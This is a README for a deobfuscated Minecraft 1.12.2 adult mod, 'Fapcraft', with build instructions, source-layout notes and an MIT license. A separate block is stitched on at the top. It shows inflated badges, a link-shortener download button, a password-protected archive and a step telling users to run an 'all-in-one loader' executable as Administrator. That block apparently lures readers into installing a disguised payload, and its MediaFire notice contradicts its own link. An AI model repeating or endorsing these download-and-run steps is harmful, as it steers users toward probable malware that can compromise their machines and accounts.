<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Fapcraft 1.12.2

Source for Fapcraft v1.1 — Minecraft 1.12.2, Forge 14.23.5.2847, GeckoLib 3.0.30.

The original jar was obfuscated with Zelix KlassMaster. This repo is the
deobfuscated, repaired source: it compiles with plain ForgeGradle and plays
like the original, minus a pile of bugs (see CHANGELOG.md).

**Adult content. 18+.**

## Building

Needs JDK 8, nothing else.

```
./gradlew build      # linux / mac
build.bat            # windows
```

First run downloads Gradle 4.9, Forge and MCP mappings (~200 MB, one time).
After that a build takes about half a minute.

Output: `build/libs/Fapcraft-1.12.2-1.1.0.jar`

GeckoLib is bundled from `libs/geckolib-bundled.jar` into the output jar, so
the result is self-contained — same as the original distribution.

## Playing

Any Forge 1.12.2-14.23.5.x install. Drop the jar into `.minecraft/mods/`.
On first launch the mod shows an age-check window.

## Layout

```
src/main/java/    mod sources (MCP names)
src/main/resources/  assets, models, animations, sounds
libs/             geckolib-bundled.jar (bundled into the build)
```

## Notes on the source

- `// BUGFIX` comments mark bugs that were found and fixed — original mod
  bugs as well as decompiler damage. `// BUG (suspected):` marks things
  that look wrong but were deliberately left alone to keep behavior
  identical. BUGFIXES.md lists them all.
- Some names are still odd (`a`, `var15_18`, block color enums used for
  misc constants). They're kept because the saved-world NBT and network
  packets depend on them.
- Entities persist a lot of state through data parameters and strings;
  expect that when editing.


---

MIT License

Copyright (c) 2026 whatimdoingwithmylife-sudo

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
